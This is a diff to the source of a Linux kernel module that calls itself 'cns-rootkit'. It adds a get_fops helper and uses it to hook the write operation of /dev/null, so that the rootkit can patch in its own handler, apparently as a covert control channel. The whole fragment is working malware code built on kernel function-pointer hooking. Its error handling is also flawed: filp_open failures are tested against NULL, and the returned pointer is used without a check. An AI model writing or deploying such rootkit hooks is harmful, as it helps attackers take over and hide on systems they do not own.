@@ -80,9 +80,17 @@ void hook_remove(void *modified_function) {
   }
 }
 
-/*int hook_remove_all() {
+struct file_operations *get_fops(char *path) {
+  struct file *filep;
+  if((filep = filp_open(path, O_RDONLY, 0)) == NULL) {
+    return NULL;
+  }
+  struct file_operations *fop;
+  fop = (struct file_operations *) filep->f_op;
+  filp_close(filep, 0);
 
-}*/
+  return fop;
+}
 
 int establish_comm_channel(void);
 int unestablish_comm_channel(void);
@@ -101,15 +109,7 @@ ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t 
 
 int establish_comm_channel(void) {
   printk(KERN_INFO "cns-rootkit: Attempting to establish communication channel\n");
-  struct file *dev_null_file;
-  if((dev_null_file = filp_open("/dev/null", O_RDONLY, 0)) == NULL) {
-    return -1;
-  }
-  printk(KERN_INFO "cns-rootkit: Opened /dev/null for reading\n");
-  struct file_operations *dev_null_fop;
-  dev_null_fop = (struct file_operations *) dev_null_file->f_op;
-  filp_close(dev_null_file, 0);
-  printk(KERN_INFO "cns-rootkit: Got file_operations structure and closed /dev/null\n");
+  struct file_operations *dev_null_fop = get_fops("/dev/null");
 
   hook_add((void **)(&(dev_null_fop->write)), (void *)cns_rootkit_dev_null_write);
   hook_patch((void *) cns_rootkit_dev_null_write);
